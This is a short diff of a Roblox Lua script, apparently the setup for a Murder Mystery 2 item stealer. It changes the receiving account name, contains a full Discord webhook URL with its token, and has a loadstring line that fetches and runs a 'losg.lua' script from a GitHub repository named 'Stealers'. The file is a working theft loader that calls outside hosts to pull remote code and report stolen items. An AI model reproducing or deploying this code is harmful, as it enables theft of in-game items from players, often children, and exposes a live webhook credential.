@@ -1,4 +1,4 @@
-Receiver = "Mm2Stocks_Roblox"
+Receiver = "JelloBloxxer"
 Webhook = "https://discord.com/api/webhooks/1320157071949172807/ABZgatXZQbUW5OpHDXHuc05FE6LQewt5-_dcGRrZEpYs6_Qu5eSrFjzMpTA6fICeQ4qw"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
